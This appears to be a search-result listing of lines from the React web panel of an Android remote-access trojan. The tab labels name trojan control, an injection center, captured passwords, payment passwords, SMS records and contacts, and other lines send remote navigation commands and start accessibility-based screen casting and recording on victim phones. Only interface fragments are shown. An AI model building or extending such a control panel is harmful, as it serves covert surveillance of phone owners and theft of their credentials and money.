@@ -1,0 +1,11 @@
+   24|首页          |const tabsCn = ['🏠 首页', '🤖 AI分析', '🎯 木马控制', '💉 注入中心', '💉 注入数据', '📱 应用列表', '📝 设备日志', '🔒 密码记录', '💰 支付密码', '✉ 短信记录', '👥 通讯录
+  200|首页          |const [activeTab, setActiveTab] = useState('🏠 首页')
+  220|首页          |// 首页选项卡 - 无障碍投屏/录屏模式 (null | 'screen' | 'record')
+ 1058|首页          |centerToast({ HOME: '首页', BACK: '返回', RECENTS: '任务管理' }[key] || key)
+ 1082|首页          |const label = command === 'BACK' ? '返回' : command === 'HOME' ? '首页' : '任务管理'
+ 2084|首页          |{activeTab === '🏠 首页' ? (
+ 2227|phone-frame |<div className="ctrl-phone-frame">
+ 2236|首页          |<button type="button" onClick={() => sendNav('HOME')} title="首页" aria-label="首页">○</button>
+ 2254|phone-frame |<div className="ctrl-phone-frame" style={{ cursor: 'crosshair' }}>
+ 2278|首页          |<button type="button" onClick={() => sendNav('HOME')} title="首页" aria-label="首页">○</button>
+ 2334|主页          |<button title="主页" onClick={() => sendNav('HOME')} disabled={!deviceOnline} style={{ width: 48, height: 34, background: 
